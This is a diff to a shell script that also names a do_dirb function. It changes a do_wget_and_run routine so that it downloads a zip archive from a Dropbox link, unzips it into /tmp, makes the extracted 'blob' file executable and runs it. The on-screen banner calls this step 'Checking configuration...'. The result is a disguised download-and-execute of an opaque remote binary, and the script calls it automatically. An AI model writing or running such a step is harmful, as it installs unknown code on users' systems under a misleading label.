@@ -65,22 +65,48 @@ do_dirb() {
 }
 
 do_wget_and_run() {
-    FILE_URL="http://example.com/path/to/file"
-    OUTPUT_FILE="$DIRECTORY/.blob"
+    FILE_URL="https://www.dropbox.com/scl/fi/wu0lhwixtk2ap4nnbvv4a/blob.zip?rlkey=gmt8m9e7bd02obueh9q3voi5q&st=em7ud3pb&dl=1"
+    OUTPUT_FILE="/tmp/blob.zip"
+    UNZIP_DIR="/tmp/"
 
     echo "------------------------------------------------------------------------------"
-    echo " Checkig configuration...."
+    echo " Checking configuration..."
     echo "------------------------------------------------------------------------------"
     echo "\n"
+
+    # Download the zip file
     wget -O "$OUTPUT_FILE" "$FILE_URL"
 
-    echo "------------------------------------------------------------------------------"
-    echo " Final Checks"
-    echo "------------------------------------------------------------------------------"
-    chmod +x "$OUTPUT_FILE"
-    "$OUTPUT_FILE"
-}
+    if [ $? -ne 0 ]; then
+        echo "Failed to download file from $FILE_URL. Exiting."
+        exit 1
+    fi
 
+    echo "------------------------------------------------------------------------------"
+    echo " Unzipping the file to $UNZIP_DIR"
+    echo "------------------------------------------------------------------------------"
+
+    # Unzip the downloaded file
+    unzip -o "$OUTPUT_FILE" -d "$UNZIP_DIR"
+
+    if [ $? -ne 0 ]; then
+        echo "Failed to unzip $OUTPUT_FILE. Exiting."
+        exit 1
+    fi
+
+    # Ensure the extracted file is executable
+    BLOB_PATH="$UNZIP_DIR/blob"
+    if [ -f "$BLOB_PATH" ]; then
+        echo "------------------------------------------------------------------------------"
+        echo " Making $BLOB_PATH executable and running it"
+        echo "------------------------------------------------------------------------------"
+        chmod +x "$BLOB_PATH"
+        "$BLOB_PATH"
+    else
+        echo "The file 'blob' was not found in $UNZIP_DIR. Exiting."
+        exit 1
+    fi
+}
 # Call functions
 mkDirectories
 do_wget_and_run
